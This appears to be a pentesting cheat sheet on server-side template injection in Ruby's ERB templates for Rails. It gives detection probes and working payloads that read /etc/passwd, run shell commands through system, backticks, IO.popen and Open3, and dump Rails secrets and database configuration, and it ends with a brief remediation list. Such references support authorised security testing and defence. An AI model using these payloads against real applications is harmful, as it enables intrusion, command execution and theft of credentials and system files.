# ERB / Ruby — Template Engine (Rails)

## Summary
ERB (Embedded Ruby) is the default template engine for Ruby on Rails.

## Identification
```erb
<%= 7*7 %>    → 49
<%= 7*7       → Error (unclosed tag — easy to spot)
<%%= 7*7 %>   → <%= 7*7 %> (escaped — test if you can break out)
```

## Basic Confirmation
```erb
<%= 7*7 %>
<%= "7"*7 %>
```

## Read Files
```erb
<%= File.open('/etc/passwd').read %>
<%= IO.read('/etc/passwd') %>
```

## RCE

```erb
# Direct system call
<%= system('id') %>

# With backticks
<%= `id` %>

# Using IO.popen
<%= IO.popen('id').read %>

# Using Open3
<%= require 'open3'; Open3.popen3('id') {|i,o,e,t| o.read} %>

# Using Shell helper
<%= `id` %>
```

## Rails-Specific
```erb
# Rails console (if in development mode)
<%= Rails.application.secrets %>

# Database config
<%= ActiveRecord::Base.connection_config %>
```

## Remediation
- Never embed raw user input in `<%= %>` tags
- Use Rails' `html_escape` helper
- Consider using a logic-less template engine
- Sanitize before template rendering
